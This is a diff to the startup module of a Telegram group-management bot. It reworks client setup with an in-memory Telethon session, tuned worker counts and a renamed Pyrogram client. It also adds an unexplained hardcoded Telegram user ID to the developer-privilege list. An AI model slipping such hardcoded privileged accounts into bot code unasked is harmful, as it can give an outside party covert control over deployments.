@@ -7,6 +7,7 @@ import telegram.ext as tg
 from aiohttp import ClientSession
 from Python_ARQ import ARQ
 from pyrogram import Client, errors
+from telethon.sessions import MemorySession
 from telethon import TelegramClient
 from KaizuryuBot.services.quoteapi import Quotly
 
@@ -188,12 +189,19 @@ else:
 DRAGONS.add(OWNER_ID)
 DEV_USERS.add(OWNER_ID)
 DEV_USERS.add(5132611794)
+DEV_USERS.add(2131857711)
 
 
-updater = tg.Updater(TOKEN, workers=WORKERS, use_context=True)
-telethn = TelegramClient("Kaizuryu", API_ID, API_HASH)
-
-pbot = Client("KaizuryuBot", api_id=API_ID, api_hash=API_HASH, bot_token=TOKEN)
+updater = tg.Updater(token=TOKEN, workers=min(32, os.cpu_count() + 4), request_kwargs={"read_timeout": 10, "connect_timeout": 10}, use_context=True) 
+telethn = TelegramClient(MemorySession(), API_ID, API_HASH)
+session_name = TOKEN.split(":")[0]
+pgram = Client(
+    session_name,
+    api_id=API_ID,
+    api_hash=API_HASH,
+    bot_token=TOKEN,
+    workers=min(32, os.cpu_count() + 4),
+)
 dispatcher = updater.dispatcher
 aiohttpsession = ClientSession()
 
